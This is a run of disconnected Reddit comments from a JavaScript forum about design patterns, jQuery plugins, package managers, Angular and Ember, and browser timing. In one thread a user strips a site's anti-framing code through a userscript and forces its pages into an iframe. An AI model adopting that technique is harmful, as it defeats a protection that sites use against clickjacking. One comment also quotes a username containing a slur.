You're 1000% correct. This is not the "Prototype Pattern", JavaScript is "[Prototype-Based](http://en.wikipedia.org/wiki/Prototype-based_programming)" programming. The [Prototype Pattern](http://en.wikipedia.org/wiki/Prototype_pattern) is something else entirely. This is the [second article](http://www.reddit.com/r/javascript/comments/1l6z27/javascript_design_patterns_the_observer_pattern/) this guy has shoveled into this subreddit that had some glaring errors in it. The first was to demonstrate an "Observer Pattern" that was really just an event model dressed up with names like Observer and ObserverList (whatever an ObserverList is in an [Observer Pattern](http://en.wikipedia.org/wiki/Observer_pattern)). You're not doing anyone any favors if you're teaching people inaccurate information. **EDIT: Here's [another horrible article](http://www.reddit.com/r/javascript/comments/1l9g39/javascript_design_patterns_the_mediator_pattern/) about a Mediator Pattern (but apparently not [THE Mediator Pattern?](http://en.wikipedia.org/wiki/Mediator_Pattern))**
As /u/drunkenfaggot said, I wouldn't really call this a pattern since it's a native language feature. Beyond that, the article doesn't do anything to describe how it's used.
This should exist, and probably does, but I couldn't find it. It's become my favorite plugin, so I wanted to share. Feedback welcome.
Have you seen the updated example? It has a subject and an observable.
&gt; lessening the necessity of media-query-driven stylesheet overrides Please no.
Maybe for you it is ok to use a compiled version without reading and understanding the source code. For me it is not. CS can be ambiguous, and the fact that a lot of people who enjoy writing CS don't know javascript very well, I simply can't trust their code without reading the source. Since CS makes my eyes bleed, and since life is short, I just prefer to avoid everything that is written in CS.
Good idea. I do suggest a small change though, for usability purposes. Get rid of if (!name) { throw "Elements must be named!"; } Change your .find() to include the attribute .find("input[name], textarea[name]").each( I also recommend passing the actual attribute name as a param. $.fn.formalizeData = function(atName) { atName = atName || "name"; in which case your .find() would be something like .find("input[" + atName + "], textarea[" + atName + "]").each( this way, if they want to use the default they can still call .formalizeData() and it would check for the 'name' attribute. but if being used in a program that already uses a name attribute (as it is a common attribute) they could say, .formalizeData('data-name') and it would look for the data-name attribute. they could also create different combos of json data from a given form by utilizing different attributes &lt;form id="form"&gt; &lt;input name="first" value="Ryan"&gt;&lt;/input&gt; &lt;input name="last" value="Dole"&gt;&lt;/input&gt; &lt;input name="nickname" data-name='username' value="dragon"&gt;&lt;/input&gt; &lt;/form&gt; 
All awesome. I'll make a github issue and try to knock it out shortly.
Awesome plugin, man! I think if you got rid of the jQuery portion this would be even a level higher; more portability :)
It's better now, yes. But I guess my real point is, what would have happened if you posted this and no one spoke up? Then say 100-1000 people look at this and fail to learn what a proper observer pattern is? They go to job interviews and get it wrong perhaps. Miss out on opportunities, etc. Or they teach other people the wrong thing. Just make sure you've done due diligence before you post a blog entry like this.
Wouldn't actually be all that hard, but also wouldn't be a huge priority for me. I'll make an issue and see if it gets any attention. thanks for the feedback! here it is: https://github.com/mazondo/formalizedata/issues/6
Cool, for Backbone there is a plugin called Backbone.Syphon that we use to do the same thing. You could check out their code for other ideas if you need any.
I use Backbone quite a bit, hadn't heard of this. I'll take a look, thanks! here it is for everyone else: https://github.com/derickbailey/backbone.syphon/ I think I prefer the more general nature of formalizeData, but I do like how well this integrates with backbone. Especially repopulating forms, that would be great for me to add as well. Thanks!
Any suggestions for what could be better?
Lush dude, can't wait to give this a whirl
The first example you mention is a great argument for using a means of abstraction, but not so much for using javascript getters and setters(a very specific type of abstraction). I would absolutely use your solutions in the way you present them(as methods), but would not use accessor properties to achieve the same results. In the section labeled "Encapsulation," I'm arguing that using accessors in place of methods can be confusing and adds little value. I'm not, however, arguing that you shouldn't use functions or methods. I like the lazy-loading example you mention. My argument still stands that using accessor properties can be confusing, but the behavior here is so straightforward, I don't see how a developer would misunderstand it. Rewritten using accessor properties, that dependency example would look something like: var deps = { get someDep(){ if(!this._someDep){ //load dep and save to this._someDep } return this._someDep; } }; And then would subsequently use it like `deps.someDep`. Thanks for spending the time to read and share some examples!
Awesome idea! I'll give it a go.
I like Angular because I found it quite flexible and bendable. Though its true that its module/DI system sucks, mostly because it conflates multiple things (for example, element scope injection with library injection) and also both its syntax choices are bad: "magical" (argument names matter) or error-prone (array).
The difference would be that this takes the input directly from the form element, so you just run $("form").formalizeData(); and it gives you a js object. Just different approaches, I think. Plus, I hadn't seen that one :)
Everyone take note: this is how FOSS "customer service" is done.
Plans for sourcemap support?
Make sure and let me know when you are finished so I can have a listen :). I can also add it to the list of examples. Good luck!
It's a two way street, the ideas help me just as much!
Thank you so much! Through console.log(data) I found that my API key/username was not yet enabled. Great learning curve, thank you! I'm not entirely sure I totally understand 'this' / 'that' (although I think I do). I'll do some more research into that, thanks!
Could you ELI5 what bower and component are intended for? How will they live in the development lifecycle of building a modular webapplication?
Will give this a shot in a couple of hours. Well done!
Fair enough, I mostly agree... but at the same time, it's hard to speak to these things too much without getting dogmatic. I know some purists who argue mutators/accessors are an anti-pattern in themselves, and I can agree with some of the arguments, but personally I've found them helpful in some cases and so I use them when convenient. To that end, I don't think there's a difference in whether they're used explicitly (as a separate method, as I demo'd) or implicitly (as an actual mutator); it's the same code, just implemented slightly differently. However, I haven't used the bona-fide mutators/accessors really yet and so there may be some finer points of their usage that I'm overlooking...
Like I describe earlier I think component.io is better for automated building so I'd check that out first (see if its support for your companies git repo is good enough). If that is no-go bower might work fine if you control all the packages and can use your own stricter format (like forcing commonJS or AMD and use certain directories). The public stuff is not bad, its just inconsistent. You can also use NPM but use github urls as dependencies (instead of version numbers). Then use browerify or something similar. Maybe it is good to always use NPM as a basis and then choose either component or bower for front-end code. This is ultra flexible, and NPM has all the sweet stuff ready for local tools, like grunt (!!!) and yeoman etc. You can use grunt to run your client side build scripts (there are grunt tasks for everything, even browerify/bower/component etc).
I'm not usually a stickler for writing errors, but the title would really be more clear with proper capitalization ("Sublime Text 3"). 
I definitely intend for my workflows to be streamlined through grunt so that developers only have to include their components in a single location and not worry about the build process. I've just got beginner jitters in that I'm not sure which one supports private repositories.
What a useful idea. I can't wait to try it out
Not very useful if you can't add/remove breakpoints while debugging.
All seem able to do that: component [this](https://github.com/component/component/wiki/F.A.Q#how-do-i-use-local-private-dependencies) and [this](https://github.com/component/component/wiki/F.A.Q#what-are-the-benefits-of-creating-an-application-out-of-private-components) For [bower](https://github.com/bower/bower#installing-packages-and-dependencies) For NPM it can be more complicated to use private repos; google a bit to see what works for you.
Let him just go ahead and edit the title... oh wait. =p
Aww... sorry :(
I agree it has limited application, but you can set your initial breakpoints using this plugin and then dynamically add and remove breakpoints inside of your web dev console in your browser of choice. Since this plugin doesn't actually connect with the js engine's debugger, it wouldn't be possible to do it the way you've suggested without creating a complete debugger inside of sublime like http://sokolovstas.github.io/SublimeWebInspector/
Just a note, this plugin should work fine in Sublime Text 2 as well. That is, I loaded it up and tried a few things and didn't run into any bugs.
On behalf of those of us too lazy to covnvert all the customizations to ST3, I thank you for notifying us of this. 
In pure JavaScript (should work in IE8+): var html = '&lt;html&gt;&lt;body&gt;&lt;div&gt;...&lt;/div&gt;&lt;div class="dynamic-wrap sidebar-wrap clearfix"&gt;&lt;b&gt;Hello!&lt;/b&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'; var el = document.createElement('div'); el.innerHTML = html; var contents = el.querySelectorAll(".dynamic-wrap.sidebar-wrap.clearfix")[0].innerHTML; console.log(contents); // "&lt;b&gt;Hello!&lt;/b&gt;"
So I think you hit on a good use case is if you are starting a lot of new projects. I somewhat frequently am doing prototypes and proof of concepts for projects. Since it has great defaults it removes a lot of the friction in doing so. One compelling reason to use Yeoman, or any other framework that is heavily documented and widely used, is that it is much easier to troubleshoot by going online in users groups and much easier to maintain than a custom framework. It's great that on a yeoman project I can have another developer jump on by pointing them to yeoman.io. I haven't encountered any custom per project frameworks with as smooth of an onboarding process. This just isn't something that should have to take a lot of time, but it frequently does. I also question the need to spend engineering effort, beyond for learning purposes, reinventing and documenting something as generic as a development framework? A development framework in conceptually related programs of a similar language is often very reusable.
i'm building systems that very much blur the line between front-end and back-end, so browserify is really the only solution that really matches my use case. Well, that and I'd rather slit my wrists with the dull side of a butter knife than have anything to do with AMD. 
my Bad, I got it to work already thanks for the info
I find bower to be more trouble than its worth. I don't need all those files just to get jquery.min.js
Looks pretty dead to me. 5 months since last edit on Github.
I'm short on time and about to leave work, but the simple answer is the objects you refer to in your walking.js file are contained within a closure, namely the function provided to $document.ready. http://www.javascriptkit.com/javatutors/closures.shtml This is not a solution that is aligned with best practices as I would structure my application entirely differently, but by binding the objects defined in application.js to the global "window" variable your calls to app.fn() in walking.js can then resolve up through the scope chain. Also I don't know how to display code on reddit.. but here goes. Investigate IIFE's (self executing functions essentially) and start using a wrapper around your code. (function(appName, window) { var myFunction = function() { }; window[appName] = { callFunction: myFunction }; }('myApp', this)); then in another js file you can safely do.. myApp.callFunction();
that usually means 2 things. either it's solid and there is no obvious or medium weaknesses, or then it has not been used much and weaknesses haven't been found. i myself would vote for former. implementing tried and tested algorithms and then publishing them as "stanford" libs means they have been hammered and inspected by a lot of eyes before going public. then again this is just my academic guess.
With your example, the object created is not callable. This is the only way to do it if you want to create callable objects. When done with non-callable objects then there is no actual advantages.
Do you think you could implement [Crossfire](http://getfirebug.com/wiki/index.php/Crossfire_0.3a7_Protocol_Reference#setbreakpoint) to dynamically add breakpoint to firebug ?
Cool demo of something I've never heard of. Until now...
I have seen this idea before, but not packaged as nicely as this. So, I gave it a try in a fairly large angular.js app and came across a few issues, which unfortunately I don't have time to properly dig into and bug report. I noticed occasionally under heavy load the readyCheck method would throw 'Timeout connecting to iframe' which seemed to trigger a recursive pile of errors which quickly crashed the chrome tab. PATCH requests didnt seem to work - the request body was missing. Also some headers where stripped/ignored, e.g. the site relies heavily on ETags which at some point were being lost. 
tessel was mentioned in this subreddit [before](http://www.reddit.com/r/javascript/comments/1ken3d/javascript_right_on_the_hardware/)
Your Super Mario example doesn't work in the latest Windows chrome. Seems like a really cool project.
Just had a friend try it on Chrome 29 (latest) and it worked for him. Are you using the Plunker example? Or the one in the examples folder? 
Indeed. What bothers me is that Yeoman uses Bower instead of Component. I think it was a bad choice.
Totally missed it. Glad I caught the demo though, looks really cool.
yip. if all else fails i add git checkouts to my package.json for npm install to roll out. i wish it was easier to run your own private layered repo, but i'm sure that will come. 
Cool demo. I've used JavaScript to fly an AR-Drone and I love the simplicity of controlling hardware with javascript. I guess the asynchronous mindset of JS is very suited to this. I wonder if there is *move_for(degrees)* function or something similar, that rotates for the given degrees (may be negative, then rotate in other direction) instead of rotating it to the given value.
I'm organizing the JavaScript track for Codemash 2014, a large generalist track in Ohio. This post represents my thoughts on what holds back most technical talks and what sets apart great ones.
You can easily create such function
Plunker
What's the error you are getting in the console?
Will your selection criteria be aligned along this post?
The short answer, is that the assignment on line 217: map = new google.maps.Map(document.getElementById("canvas"), myOptions); is overwriting the initial assignment on line 168: map = { The long answer is that you should read up on how variable declaration and scoping works on javascript (based on how "map" is being added to the global scope implicitly). "use strict" may help you catch these kinds of errors.
&gt; A whitepaper on SJCL (also by Emily Stark, Mike Hamburg and Dan Boneh) was published in the 2009 Annual Computer Security Applications Conference.
I use regular expressions every day and I'm extremely comfortable with them. But the article is right, they are not suitable if the task is to match *any arbitrary string*. Consider the author's `aContainsB` function: function aContainsB( a, b ) { return a.indexOf(b) &gt;= 0; } Can you write that function with a regular expression?
They'll certainly be informed by it. Until I take stock of what submissions are made, I won't know for sure how to best sort through them.
You surely mean **&gt; 0** instead if **&gt; 1**? Also this is a really stupid way to do it. It will do much more work then other solutions. It will spit *every* occurrence of the search string. This is crazy on large strings with many matches. Try not to be clever and instead just use a str.indexOf(search); based solution. Don;t use RegExp based checks like match for simple string literals, RegExp has overhead and !!str.match("blue"); returns stuff you don't need.
The data hiding example in the article can be achieved by using getters and setters in conjunction with function closures: var obj = (function() { var hiddenProp = undefined; return { get prop() { return hiddenProp; }, set prop(newVal) { if (newVal &gt; 0) { hiddenProp = newVal; } else { throw new Error("Must Be Positive!"); } } }; })(); Object.hasOwnProperty('obj', 'hiddenProp'); // false obj.prop = 12; obj.prop; // returns 12 obj.prop = -2; // Error gets thrown, YAY!! obj.hiddenProp = -2; obj.prop; // still 12
Ah, I haven't used RegExp() much to create expressions, apparently you would need to escape special characters in the function. It would definitely be much worse than indexOf then, ha. Just wanted to point it out since it's pretty unused. It can be pretty helpful though, recently I needed to replace all instances of string a in b, and so ended up using RegExp() for it. I felt it was a little nicer than a while loop.
Nice idea, gotta have this for emacs now.
No, `&gt; 1` is correct here. When there are no matches, `string.split()` returns an array with a single element containing the entire string. You're right that this would be a bad way to do it for reasons of performance and perhaps code clarity. But it is good to be familiar with how `string.split()` works in these edge cases, since it is such a useful method for other purposes.
no, I mean &gt; 1. If you use split and there is no occurrences then it will return an array of one element, so it will only contain the substring if there are 2 or more elements in the array. I know this is not a good solution - that's why I put the last sentence saying not to use it in the real world as it will take up more memory and be slower. My objective was not to say "do it this way" it was just to let others know that .split() exists and is worth looking at to know how it works as it is useful in other cases
You don't need the new RegExp part as match will convert a string to a regex already. 
When you build your project (`grunt build`), all the CSS and JS files you need should be concatenated and minified. So you've got the entire repository in dev, but when you build and release, you only include what you need. If you're not doing this already, you really should, because apart from a good build system (which is probably the biggest plus of using Yeoman to bootstrap your app), you're spot on in your criticism of bower.
Yea, my bad (it was early :) You can do a crude but fast single-var template with it as well. var arr = myString.split('{var}'); Later: var res = arr.join(myReplacement); Saves iterating the string on every replacement like String.replace() would do.
Yes of course! That's nice from component.io, that you can easily do just that with full automation. With bower you have to bring in browserify to manually configure many de-ifiers to get the random JS modules in shape. And so much cruft, you have to manually specify every module's files and folders for your grunt tasks.
link gives a github 404
Oops. I had it on private. Should be working now! Apologies!
All good, thanks for the report back! 
I'm a noob when it comes to javascript frameworks other than jquery/underscore. I totally understand that having what you're targetting in your HTML provides you more reusability. So, that's clearly good. But why is that better than something like &lt;button class="fadeDataTarget" data-target="#someElement"&gt;Fade that stuff&lt;/button&gt; $(".fadeFataTarget").click(function() { $($(this).data('target')).fade(); }
Now that phonegap uses node and npm, I also found that grunt+phonegap to be a great combo.
The Node eclipse plugin allows you to do this, but it is for the server side. You can single step, examine variables and console.log() output goes to the console in Eclipse etc.
CoffeeScript IS JavaScript. It has different syntax, **though the same semantics**. Therefore, one can say it's just a different way of writing JavaScript. You can't say the same about CoffeeScript and Ruby, even though they're similar syntactically, they're extremely different semantically. And, you can function hoist by simply defining your functions at the top of scope.
jQuery is a library. CoffeeScript is a language and it's equivalent to JavaScript, see http://www.reddit.com/r/javascript/comments/1l8m3g/xdomain_a_pure_javascript_cors_alternative/cbyt00k
This looks very interesting... I have actually been wondering for a little while how successful people are with using angular JS for natively ported mobile webapps. Also, why use phonegap over cordova? I understand they are the same engine, but I am curious what people's experiences are.
I use this: ~. ~ -1 == 0 (false) ~ 0 == -1 (true) ~ (N &gt; 0) == -N - 1 (true) var str = 'Jerry, Brian, Nancy'; if (~str.search('Jerry')) { [...] }
I actually used the cordova-cli for my personal project, but found that Phonegap's documentation after version 2.9.0 (for 3.0) used the phonegap CLI instead. It also seemed a bit easier to use than the cordova cli for the average dev. I've had a really good experience using Angular on PhoneGap. Of course they work better on faster phones, but I've release 2 apps now and they're working great so far. There are some quirks like $digest cycles being run too often that didn't happen on the browser, but I was able to get around them. Especially now with angular 1.2 (currently in rc1), the ngAnimate and ngTouch modules really make building a robust mobile app a reality. This package is using 1.2, so you'll be living on the edge a bit. :)
I think I'm starting to understand. If I'm not mistaking, the angular way essentially created a model a view and a controller- where as the jquery method either created none of those or only a controller and view- but generally no model. Even so, is there perhaps a video that goes further into this, or alternatively reading material? Most things I find here are either for people already comfortable with angular or too simple to really show the benefits.
I think you might want to check your package.json: why are all those dependencies duplicated? Stuff that is in `dependencies` doesn't have to be in `devDependencies` too. And most of it should only be in `devDependencies` anyway. Also maybe make it a grunt-init or yeoman generator?
Why bower and not component.io? How did you handle the random mess of bowers component structure? I see no browserify or anything like that?
Looks great!
Needs a web interface. edit: like an editor
It's separating UI behaviour from data the app needs to work with and events that happen, allowing more modular and manageable code. The domain OP's link is under, http://egghead.io/lessons has 50 videos on Angular, probably the most extensive out there.
So what you're on the brim of is [AMD](https://github.com/amdjs/amdjs-api/wiki/AMD), Asynchronous Module Definition. The defer component in mod_pagespeed does not do this. It defers all JS scripts to synchronously load at the DOM read state. I would look at AMD modules that use CommonJS as your module definition. A great start would be [Require.js](http://requirejs.org/docs/commonjs.html). 
Ember Data's totally optional. JQuery is an Ember dependency, so you can always use its excellent AJAX functions to interact with your server API. It's been pretty unstable, and it's going to be shaken up a lot in the near future. Here's a blog post about their overarching goals with it: http://emberjs.com/blog/2013/05/03/ember-data-progress-update.html
No, that's not like noSuchMethod. That object has a toString() method, but you're intercepting that one, too. Also, Proxy.create is from the old API.
Here is the template I am using if this helps at all: &lt;html&gt; &lt;meta charset="UTF-8"&gt; &lt;head&gt; &lt;!-- java script program goes in the head section as a user-defined function --&gt; &lt;script type=text/javascript encoding=12&gt; "use strict"; function myProgram() { // put your source code below the dashed line //--------------------------------------------------- var years; var months; //years = 42; years = Number ( prompt("Age of the person (in years)?") ); months = years * 12; months = months; //this is just updating the value of the variable alert("If a person is " + years + " years old,"); alert("Then this is " + months + " months old"); //--------------------------------------------------- // your source code belongs above the dashed line } &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Program Template&lt;/h1&gt; &lt;!-- make a button to run the program here --&gt; &lt;input type="button" value="run this program" onclick="myProgram()" &gt; &lt;!-- end button part --&gt; &lt;p&gt; Use this basic HTML document as a starter for writing your programs. It provides a button that runs your code on mouse click. &lt;/p&gt; &lt;/body&gt; &lt;/html&gt; 
Thank you, I guess giving user a notice that app will work better in separate window is a way to forget about 1000 milliseconds issue.
I wonder if rather than use AudioContext's 'onended' event, you might prefer &lt;audio&gt;'s timeupdate event. You could embed a silent audiofile as an audio tag, and set it to loop the empty audio. If its like video, you listen to the timeupdate event it would give you something like 10-15 events per second. audio docs mentioning timeupdate event: http://www.w3.org/wiki/HTML/Elements/audio#Media_Events this page is nice for experimenting with the &lt;video&gt; events, there might be somthing similar for audio: http://www.w3.org/2010/05/video/mediaevents.html 
requestAnimationFrame https://developer.mozilla.org/en-US/docs/Web/API/window.requestAnimationFrame
Don't most implementations of requestAnimationFrame throttle it when the tab is inactive? I thought that was supposed to be one of its main selling points.
This is an excellent form of timing when the user has focus of the web page, but requestAnimationFrame is optimized so that it doesn't occur when the user is on a different tab, or window. A quick test of this can be viewed [here](http://demos.sixrevisions.com/2010/09/11/demo.html), if you watch the ball, then switch to another tab for any amount of time, and switch back tothe ball tab, you'll notice the ball is at the same location before you changed tabs.
I didn't know about component.io. I'll take a look and maybe switch over.
Have you looked at setImmediate () and its various shims? It is really fast and not a real timer but might offer same options for hacking a solution.
I would give this method a try: video is supposed to keep playing while the tab is inactive.
Wow, that's a nice idea and it actually may be a solution, thank you very much for suggestion, will try it.
Damn you're right. I completely forgot about that. I'm on my phone right now so can't test it, but what about embedding the requestAnimationFrame in an iframe. Might be a way to get around the tab problem. 
[JSfiddled it, apparently that doesn't work either](http://jsfiddle.net/hrdcP/).
Does it have the same behaviour in a web-worker?
Lots of bugs on FF 
Sort of, you can try it here (the best way to see the difference is to open it on iOS browser) [https://dl.dropboxusercontent.com/u/4301006/timer/index.html](https://dl.dropboxusercontent.com/u/4301006/timer/index.html) just set timeout for like 10 seconds, start it and try to move or zoom the page while it executes, web-worker timeout obviously have some latency if touch is initiated but it's not blocked EDIT: actually it looks a bit strange, zoom in or zoom out totally freezes the script execution, even worker events, but scrolling freezes only timeout
This post is far too basic/simplistic for this subreddit. It may be better suited for /r/learnjavascript. Hope that explains the downvotes you're getting.
I suggest using jQuery for this. You can get your output as a js object with [getJSON](http://api.jquery.com/jQuery.getJSON/)
Definitely will try, thank you
If you look at the example response, you'll see that (assuming you have a proper API key) you are getting back some JSON which looks something like this: { "budget": 63000000, "status": "released", "title": "Fight Club" } (but with a lot more fields). That JSON is your `this.responseText`. So in your callback where it's alerting all of that stuff, instead you would parse out the response text `var movieData = JSON.parse(this.responseText);` then use that data to manipulate the page. The simplest way of doing that would be using `document.write`. For example, if you wanted to make a header that has the title of the movie in it then you could do `document.write('&lt;h1&gt;' + movieData.title + '&lt;/h1&gt;');` There are much better ways of manipulating a page but that should get you going in the right direction.
I think new Date() will work better as a time measurement even within the timeupdate event. The actually timing of the event may not line up with when you want to start audio events, but maybe it will get you close and you can pad them with silence. These are just some ideas, no guarantees. Playing while tabbed out though doesn't seem like its necessarily worth the effort, or there might be more useful functionality to build for now.
I believe there is more smart approach that holds all music like a flow of signal, so i won't have to build arrays of 1 and 0 each time but my functional programming skills are weak and i'm not smart enough to build it even in my head :(
The only way to make that not suck is to use the [new audio APIs](https://developer.mozilla.org/en-US/docs/Web_Audio_API). End of story. You need scheduling, not timing. [AudioParam](https://developer.mozilla.org/en-US/docs/Web/API/AudioParam) does this kind of thing. Basically, you always have to schedule things for the next, say, 100msec. This way it will still be real-time-ish and you won't get any underruns even if the GC runs or if there is some other spike.
I really have no idea about the error. I'd start with breaking that line with response.response down into multiple statements to ensure you're correct about where the error's being triggered. I'd also put a breakpoint in that callback and explore the arguments it's being called with to ensure they're what you expect then try executing each portion of the current statement one at a time to ensure all your assumptions about the code are correct (e.g.: an element matching the selector "div.response" is found, etc.).
Should I be able to select one of the two countries? (Using Chrome)
It can only be this line I think: $this.find('div.response').html(response.response).css('display', 'block'); If you comment it out does the code work?
Insert a `debugger` statement in the anonymous function given to _done_ before you access the response object. Then inspect the value of response. I suspect that it's probably something like response.body.response, or maybe the data's not there. Note: For this to work, you need to be in Chrome with the web inspector open: View -&gt; Developer -&gt; Developer Tools
I believe that response.response references an array, and you can't simply assign it as html. I tried on jQuery 1.6.4 in [jsfiddle](http://jsfiddle.net/hpBEh/1/) and that should return an empty string. Now on the exception itself it seems to be a DOMException, so there's probably an interaction between jquery objects and DOM Objects that is not permitted. As someone suggested, put a debugger; in your source and you should be able to gather more information.
Looking at your code, I would guess that the issue is due to this: .html(response.response) If I'm reading it correctly, `response.response` is a reference to an array, and thus throws an error when you try to assign its value via the `html()` method. Are you sure you're not trying to assign `response.response[i]` where `i` = the index of the text node in the array of responses?
When I load the page, the text boxes are pre-populated with the country names. I was expecting to be able to click one of the boxes thinking it was a button.
What about it?
I thought you left that out, but I guess I missed it. After looking at your error message again, I don't think the issue is with the response. It's more likely caused by a bad jQuery selector.
Ruhroh... sample accuracy in a non-blocking asynchronous language! There are a number of audio libs written on top of web audio API that might be able to help you, but true sample accuracy is not yet available in the browser afaik. Check out [Flocking](https://github.com/colinbdclark/flocking)... I wrote the original scheduler in a web worker but it had a sway of about 3 ms or so. The new scheduler is a bit better, but still not perfect. In the [Playground](http://flockingjs.org/demos/interactive/html/playground.html) you can find an example of asynchronous scheduling which could definitely be used for what you want to do, although I cannot attest to its current accuracy (although I'm sure Colin Clark would love to talk to you about it) [Waax](https://github.com/hoch/waax) by a fellow ccrma student Hong Chan is another possible library to use, although I have not played with its scheduler. Finally Charlie Roberts has a lib called [Gibber](http://www.charlie-roberts.com/gibber/) which he uses for live coding. I have seen examples of sequencing done so there might be something to explore in there As well... you might want to check out the below article about scheduling in the browser http://www.html5rocks.com/en/tutorials/audio/scheduling/
&gt; Component I haven't heard of this one... I think Bower is nice if you have a build process. Doing 'bower install' is a nice shortcut to grab all the libraries you need...but for small fries, its just too much to include in a repo. 
probably a little bit of both. I remember reading about this 5 years ago or so...and nobody was talking about it then much either.
The thing is that the data bower grabs is very random in format: you can really depend on what javascript module format any package uses or if it does include a pile of cruft files. Component does pretty much same thing but the package follow a stricter format so your build can be a lot simpler. But they are very similar in many other ways.
Yes, I'm aware of `proxy()` the new direct proxy API, but that is not yet implemented in node, we need to wait till v8 pushes it. &gt; Proxy() TypeError: Property 'Proxy' of object #&lt;Object&gt; is not a function 
Yes but then each object sharing those function would also share their list's of events as each function would be pointing to the same event object.
Huh ?
You should transform it into a quiz :) It's not working properly at the moment but I would just invest same more weekends on it. Good luck! 
Yeah you would need to close around the events variable or augment the object with events too. EDIT: Can't think how closing around it would solve the problem - augmenting the object with events would work though
This is really great news. Hopefully seeing it has passed RC stage will make people actually give it another go if they dismissed it earlier. Ember has a high barrier to entry; but imho significant payoffs in the amount of good architectural building blocks you have at your disposal, and maintainability of the code base. Just compare something like Ember-Model (which, given some more love, could be *even* more legible) to Backbone relational. That being said, I don't quite know how I feel about this though: &gt; We're also switching our releases to follow a more Chrome-like model. This means that you can expect a new release every six weeks. We'll have more details about this soon.
I am happy to see ember hit 1.0...it is a library I have had my eye on and will be using for a project or two in the near future. With a 1.0 release, I kind of hope for API stability...and I also am worried about that 'chrome-like' release schedule...seems like the stability of the API would suffer because of that.
I've been keeping up with ember since around ~RC2, and honestly, as long as you weren't doing something that goes against the grain the the framework, the APIs have remained quite stable. It's mostly the router that has changed (for the better).
So this is basically a small subset of the Promise interface.
&gt; Hopefully seeing it has passed RC stage will make people actually give it another go if they dismissed it earlier. I hope for this too. I know I'm a little more serious about checking it out for my next project now that it's 1.0.
I really wish they would have push changes to force dependency injection into the framework to the degree that angular has. Every ember app I have had to work on was nearly impossible to unit test because bad developers opted out if dependency injection.
&gt; I really wish they would have push changes to force dependency injection into the framework to the degree that angular has. Not sure what you mean: Ember *has* dependency injection if you need it. It's used in quite a lot of places in the source. Do you have any specific examples?
I can't really do a good job of comparing the two; but components in Ember are basically just isolated views; see the [source code](https://github.com/emberjs/ember.js/blob/v1.0.0/packages/ember-views/lib/views/component.js#L10). There's not a lot of code that actually make up the unique parts of the components. Browsing through the Angular documentation on directives it seems most of these things are possible with Ember components, but it doesn't have the formal syntax that Angular has with the Directive Definition Object.
I always look for the silver lining in things. In this case, I learned to double check for the shift key, which is one of my biggest pet peeves with HootSuite. Maybe someone should link them to this post.
I went with Ember (RC2 at the time) for a project that is now in production, whose most important factor was complete and easy state management. Complex UI configurations were handled with ease thanks to Ember's state machine (router) and named outlets. It even played nice with major Raphael.js integration. Excited to see where this goes, since it's already a powerful and well-thought-through framework.
Interesting observation, especially considering this other blog post of mine this weekend: http://gist.io/6400266 I'd not been previously exposed to promises, having been stuck in a rut as an ExtJS developer for 4.5 years. But now in the last 3 months I've been using node.js, underscore.js, etcetera, and I think I'm starting to get the hang of developing in this way.
Ohhh. Man would I like to pick your brains. What testing framework are you guys using? Can you say anything about your project setup?
This is probably a cross domain problem and you're not supposed to have a workaround.
+1 I've been using JasmineRice and getting models rigged up just for unit testing makes me want to cry.
A for effort but needs alot more work.. keep at it
friends don't let friends use image carousels. 
It was added to Ember well after Angular's release. Angular forces you to use dependency injection. Ember does not. Consequently, inexperienced developers are more likely to skip DI entirely and write tightly coupled code.. Also I've never understood the desire to want to have an additional template engine when you already have HTML and he Dom. Its a great framework. Angular is just better designed. **EDIT: For tone**
Angular forces you to use it. Ember added it as an afterthought and you don't have to use it. It allows people to write bad code.
Iframes are bad at most everything that isn't requesting content supplied by a URI. Without knowing the specific goal you're looking to achieve I'd say that you'll have better results with the target page interpreting a series of GET parameters than navigating the dark arts of cross-document DOM manipulation.
Not trolling. Sorry if my opinion bothers you.
If the point is to let the user select one country or the other, I would recommend turning the text inputs into buttons with the country name on them. 
Basically, it's a helper script, it gets the url in a link (guaranteed always on the same domain) and gets the page via ajax, these pages have a line of js to check if they're in an iframe, I replace("protection code here", "") the ajax response to remove it and then write the content into an iframe to save the user having to visit the page. The issue is that this page has to act like it's an actual page, due to all the scripts that run on it, but can't be loaded in an iframe via the 'src' attribute due to the js code checking if it runs in an iframe. Thus I have to write it to the frame manually. I've tried using "data:text/html.....," + ajaxResponse But it doesn't load the page at all.
Although the site doesn't utilise https I'll triple check. As the script is running from the browser window itself (under greasemonkey) on a site I don't control (merely aiding users in their use of it), I can't do that. But would it be possible for me to load a page, remove everything from the DOM and write into it? (I'll give it a try anyway for funsies). Thanks for the information.
Try setting the source of the iframe to javascript:void(0) or javascript:"" when you create it. That should prevent this issue from showing up.
jQuery 1.2? Please tell me this is some legacy code... Anyway, don't expect very ancient jQuery versions to work fine in modern browsers...
What version of Firefox? It looks ok to me. Arr... I'ts so frustrating that things works only on your machine...
I thought you might've been on to something there, but it still throws the error: SecurityError: The operation is insecure. Citing the: iframe.contentWindow.document.open() When the source is set to either: javascript: '' or javascript:void(0) I think I'd be happier if it was more meaningful! Tell my why it's insecure mozilla!
The webpage I'm loading contains a line of code to prevent it being loaded in iframes (for security purposes). In order to remove this code I have to AJAX the entire page (doctype 'n all) and remove that one line. I then can safely load it into an iframe (hence the full page request) so that it can behave as it normally should. Loading it into other elements mean the javascript elements on the page don't function (which is crucial). Div's don't treat a HTML document with javascript (in text/html format) as a normal page, I have to use an iframe for that.
Hey Paul, Thanks a bunch for this. Just changed this assignment and got everything working. Will definitely look into scoping! Thanks again!
Hey kungfufrog. Thanks for the direction! I'll have to check out scoping and IIFEs in javascript! Thanks for your help!
Fixed the issue, I wrote the document writing scripts to a script tag on the existing page.
I would love to read to justifications for the downvotes. Nothing I said was false. It is an issue I have run into multiple times over the last few years. 
Not sure how relevant javascript is to gaming, but I would not bother with any other language if you want to make a career of it.
In fact, I can't find a single example of dependency injection or even modularization in any of that Todo app. That wouldn't be possible in Angular.
feel free to tweet Mark @toshuo
Author here, obviously I loved Hack Reactor. I did a ton of online classes with varying results, too. Now I'm focusing on learning on Coursera and at work.
I've written a large application using Angular where a lot of the UI depended on writing directives (charting). I can say that ember components feel more straight forward and more like the true web components specification. Angular directives in a lot of ways feel like a hack. For instance isolate scope in angular just feels dirty. To write a web component you shouldn't have to redefine the context/scope in which it's being rendered into.
